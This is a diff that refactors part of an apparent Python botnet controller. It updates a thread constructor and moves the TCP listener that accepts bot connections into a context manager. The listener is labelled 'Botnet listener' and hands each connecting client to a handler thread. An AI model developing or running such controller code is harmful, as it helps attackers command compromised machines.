@@ -39,7 +39,7 @@ class BotHandler(threading.Thread):
 
 class BotCmd(threading.Thread):
     def __init__(self, qv2):
-        threading.Thread.__init__(self)
+        super().__init__()
         self.q = qv2
 
     def run(self):
@@ -70,21 +70,21 @@ class BotCmd(threading.Thread):
 
 
 def listener(lhost, lport, q):
-    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-    server_address = (lhost, lport)
-    server.bind(server_address)
-    server.listen(100)
+    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server:
+        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        server_address = (lhost, lport)
+        server.bind(server_address)
+        server.listen(100)
 
-    print(colored(' [+] Starting Botnet listener on tcp://' + lhost + ':' + str(lport) + '\n', 'green'))
-    
-    BotCmdThread = BotCmd(q)
-    BotCmdThread.start()
-    while True:
-        (client, client_address) = server.accept()
-        newthread = BotHandler(client, client_address, q)
-        Socketthread.append(newthread)
-        newthread.start()
+        print(colored(' [+] Starting Botnet listener on tcp://' + lhost + ':' + str(lport) + '\n', 'green'))
+        
+        BotCmdThread = BotCmd(q)
+        BotCmdThread.start()
+        while True:
+            (client, client_address) = server.accept()
+            newthread = BotHandler(client, client_address, q)
+            Socketthread.append(newthread)
+            newthread.start()
 
 
 def main():
